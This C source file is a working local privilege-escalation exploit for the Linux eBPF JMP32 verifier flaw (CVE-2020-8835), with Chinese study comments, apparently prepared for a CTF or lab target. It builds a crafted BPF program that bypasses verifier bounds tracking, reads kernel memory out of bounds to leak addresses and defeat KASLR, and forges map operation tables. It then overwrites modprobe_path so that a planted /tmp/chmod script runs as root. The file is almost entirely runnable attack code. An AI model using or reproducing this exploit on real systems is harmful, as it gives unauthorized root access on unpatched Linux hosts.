// 修改自 https://github.com/rtfingc/cve-repo/tree/master/0x04-pwn2own-ebpf-jmp32-cve-2020-8835

#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include "linux/bpf.h"   
#include "bpf_insn.h"    

#define LOG_BUF_SIZE 65535

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
char bpf_log_buf[LOG_BUF_SIZE];
                                          

static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version);
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);

void init(){
    // 這個是 modprobe_path 的利用方式, 這邊不介紹
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod"); 
    system("chmod +x /tmp/chmod");
    system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}

struct bpf_insn insns[]={

    // bpf_map_lookup_elem(ctrlmap, ...) 
    BPF_LD_MAP_FD(BPF_REG_1,3),                                     // r1 = 3
    BPF_ALU64_IMM(BPF_MOV,6,0),                                     // r6 = 0
    BPF_STX_MEM(BPF_DW,10,6,-8),                                    // [r10-8] = r6
    BPF_MOV64_REG(7,10),                                            // r7 = r10
    BPF_ALU64_IMM(BPF_ADD,7,-8),                                    // r7 -= 8
    BPF_MOV64_REG(2,7),                                             // r2 = r7
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0, BPF_FUNC_map_lookup_elem), // bpf_map_lookup_elem(r1, r2, ...)
    BPF_JMP_IMM(BPF_JNE,0,0,1),                                     // if r0 = 0 : jmp PC + 1
    BPF_EXIT_INSN(),                                                // exit

    // r9 = ctrlmap[0]
    BPF_MOV64_REG(9,0),                                             // r9 = r0
    BPF_LDX_MEM(BPF_DW,6,9,0),                                      // r6 = [r9] ( = 2 見 (a) )

    // BPF_JGE 設定 tnum.umin_value = 1, 根據安全客說執行完會變 1 (之後研究出來在補上, 或是有大老留言教一下, 感激不盡)
    BPF_JMP_IMM(BPF_JGE,6,1,1),                                     // if r6 >= 1 : jmp PC + 1
    BPF_EXIT_INSN(),                                                // exit

    // BPF_JLE 設定 tnum.umax_value = 2^32 + 1
    BPF_MOV64_IMM(8,0x1),                                           // r8 = 1
    BPF_ALU64_IMM(BPF_LSH,8,32),                                    // r8 <<= 32
    BPF_ALU64_IMM(BPF_ADD,8,1),                                     // r8 += 1
    BPF_JMP_REG(BPF_JLE,6,8,1),                                     // if r6 <= r8 : jmp PC + 1
    BPF_EXIT_INSN(),                                                // exit
             
    // JMP32 觸發漏洞
    BPF_JMP32_IMM(BPF_JNE,6,5,1),                                   // if r6 != r5 : jmp PC + 1
    BPF_EXIT_INSN(),                                                // exit

    BPF_ALU64_IMM(BPF_AND, 6, 2),                                   // r6 &= 2
    BPF_ALU64_IMM(BPF_RSH, 6, 1),                                   // r6 >>= 1

    //r6 == offset ( 就是文中提到 verifier 認為是 1 的 reg, 但因為上面兩個操作, 所以 verifier 現在認為 r6 = 0, 但事實上是 1)
    //r9 = inmap
    BPF_ALU64_IMM(BPF_MUL,6,0x110),                                  // r6 *= 0x110  (r6 == 0x110)

    // outmap
    // inmap / outmap 請參考 https://www.chainnews.com/zh-hant/articles/674289556476.htm
    // bpf_map_lookup_elem(expmap, ...)
    BPF_LD_MAP_FD(BPF_REG_1,4),                                      // r1 = 4
    BPF_ALU64_IMM(BPF_MOV,8,0),                                      // r8 = 0
    BPF_STX_MEM(BPF_DW,10,8,-8),                                     // [r10-8] = r8
    BPF_MOV64_REG(7,10),                                             // r7 = r10
    BPF_ALU64_IMM(BPF_ADD,7,-8),                                     // r7 -= 8
    BPF_MOV64_REG(2,7),                                              // r2 = r7
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,BPF_FUNC_map_lookup_elem),   // bpf_map_lookup_elem(r1, r2, ...)
    BPF_JMP_IMM(BPF_JNE,0,0,1),                                      // if r0 != 0 : jmp PC + 1
    BPF_EXIT_INSN(),                                                 // exit

    // r7 = expmap[0]
    BPF_MOV64_REG(7,0),                                              // r7 = r0

    // 跳到 r7 -= 0x110 (單位是 bpf_map)
    BPF_ALU64_REG(BPF_SUB,7,6),                                      // r7 -= r6 越界了 !!!
    BPF_LDX_MEM(BPF_DW,8,7,0),                                       // r8 = [r7]

    // inmap[2] == map_addr
    // 提醒一下: r9 = ctrlmap
    // ctrlmap->inner_map_meta = r8 (fake_map)
    BPF_STX_MEM(BPF_DW,9,8,0x10),                                    // [r9+0x10] = r8

    // TBD
    BPF_LDX_MEM(BPF_DW,8,7,0xc0),                                    // r7 = [r8+0xc0]
    BPF_STX_MEM(BPF_DW,9,8,0x18),                                    // [r9+0x18] = r8

    BPF_STX_MEM(BPF_DW,7,8,0x40),                                    // [r7+0x40] = r8
    BPF_ALU64_IMM(BPF_ADD,8,0x50),                                   // r8 += 0x50

    BPF_LDX_MEM(BPF_DW,2,9,0x8),                                     // r2 = [r9+0x8]
    BPF_JMP_IMM(BPF_JNE,2,1,4),                                      // if r2 != 1 : jmp PC + 4
    BPF_STX_MEM(BPF_DW,7,8,0),                                       // [r7] = r8
    // r7->map_type = BPF_MAP_TYPE_STACK
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),                     // [r7+0x18] = BPF_MAP_TYPE_STACK
    // r7->max_entries = -1
    BPF_ST_MEM(BPF_W,7,0x24,-1),                                     // [r7+0x24] = -1
    // r7->spin_lock_off = 0
    BPF_ST_MEM(BPF_W,7,0x2c,0x0),                                    // [r7+0x2c] = 0

    // exit(0)
    BPF_ALU64_IMM(BPF_MOV,0,0),                      // r0 = 0
    BPF_EXIT_INSN(),                                 // exit
};

void prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1); // 3
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1); // 4
    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns, sizeof(insns), "GPL", 0);
    socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
    setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
}

void pwn(){
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(0x100);
    char *expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++)
        expbuf64[i] = i+1;

    ctrlbuf64[0]=0x2; // (a)
    ctrlbuf64[1]=0x0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();

    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    bpf_lookup_elem(expmapfd,&key,expbuf);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    uint64_t kaslr = map_leak - 0xffffffff82016340;
    uint64_t modprobe_path = 0xffffffff82446d80 + kaslr;

    uint64_t fake_map_ops[]={
        kaslr +0xffffffff8116ec70,
        kaslr +0xffffffff8116fa00,
        0x0,
        kaslr +0xffffffff8116f2d0,
        kaslr +0xffffffff8116ed50,// 5: map_get_next_key
        0x0,
        0x0,
        kaslr +0xffffffff81159b30,
        0x0,
        kaslr +0xffffffff81159930,
        0x0,
        kaslr +0xffffffff8116edd0,
        kaslr +0xffffffff8116f1c0,
        kaslr +0xffffffff8116ed80,
        // 15: map_push_elem ( 改寫成 5. 的位址 map_update_elem 呼叫 map_push_elem =>(改寫後) 呼叫 map_get_next_key 位址)
        // 安全客說: *flags = value[0], 但我覺得是 *flags = value[1] , 因為 *next = index + 1;
        kaslr +0xffffffff8116ed50,
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116f050,
        0x0,
        kaslr +0xffffffff8116ee80,
        kaslr +0xffffffff8116f870,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116ece0,
        kaslr +0xffffffff8116ed10,
        kaslr +0xffffffff8116ee50,
    };

    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&key,expbuf,0);

    //overwrite modprobe path
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x1;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    writemsg();

    // 修改 modprobe_path = "/tmp/chmod"
    expbuf64[0] = 0x706d742f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path);
    expbuf64[0] = 0x6d68632f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+4);
    expbuf64[0] = 0x646f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+8);
}


int main(int argc,char **argv){
    init();
    prep();
    pwn();
    system("/tmp/fake");
    system("ls -l /flag");
    return 0;
}

                           
static void writemsg(void) {
    char buffer[64];                                         
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));   
}

static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  
}

static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  
}

static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}